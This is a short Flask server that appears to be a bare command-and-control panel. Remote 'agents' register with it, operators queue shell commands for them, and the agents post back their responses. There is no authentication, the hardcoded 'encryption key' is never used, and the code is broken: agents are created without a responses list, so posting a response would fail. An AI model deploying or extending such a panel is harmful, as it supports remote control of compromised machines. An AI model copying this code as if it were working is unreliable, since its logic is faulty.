from flask import Flask, request, render_template, jsonify
import base64
import os

app = Flask(__name__)

# Encryption key
encryption_key = "ghostintheshell"

# Command storage
commands = {}

# Agent storage
agents = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/agents')
def agents_list():
    return render_template('agents.html', agents=agents)

@app.route('/agents/<agent_id>')
def agent_detail(agent_id):
    return render_template('agent.html', agent=agents.get(agent_id))

@app.route('/commands')
def commands_list():
    return render_template('commands.html', commands=commands)

@app.route('/commands/create', methods=['POST'])
def create_command():
    agent_id = request.form['agent_id']
    command = request.form['command']
    commands[agent_id] = command
    return jsonify({'success': True})

@app.route('/agents/register', methods=['POST'])
def register_agent():
    agent_id = request.form['agent_id']
    agents[agent_id] = {'id': agent_id, 'commands': []}
    return jsonify({'success': True})

@app.route('/agents/<agent_id>/commands', methods=['POST'])
def send_command(agent_id):
    command = request.form['command']
    agents[agent_id]['commands'].append(command)
    return jsonify({'success': True})

@app.route('/agents/<agent_id>/responses', methods=['POST'])
def send_response(agent_id):
    response = request.form['response']
    agents[agent_id]['responses'].append(response)
    return jsonify({'success': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)